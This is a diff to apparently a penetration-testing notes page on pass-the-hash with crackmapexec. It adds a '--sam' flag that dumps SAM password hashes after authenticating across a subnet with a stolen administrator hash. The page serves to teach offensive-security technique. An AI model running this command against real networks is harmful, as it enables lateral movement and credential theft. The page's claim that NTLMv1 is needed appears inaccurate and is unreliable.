@@ -45,13 +45,15 @@ Method:
 
 {% code title="Pass the Hash attack command using crackmapexec." %}
 ```shellscript
-root@kali:~# crackmapexec smb [Network IP]/[CIDR Notation for Subnet] -u administrator -H [User's Password Hash Obtained Before] --local-auth
+root@kali:~# crackmapexec smb [Network IP]/[CIDR Notation for Subnet] -u administrator -H [User's Password Hash Obtained Before] --local-auth --sam
 ```
 {% endcode %}
 
 -> "-H": signals the user of a hash. We need NTLMv1 here.&#x20;
 
 -> "--local-auth": used to log in to those machines locally against their SAM database, not the domain. This will only work if there is a local administrator account with the same password hash on multiple machines.&#x20;
+
+-> "--sam": Dumps SAM hashes for other users upon authenticating.
 
 
 
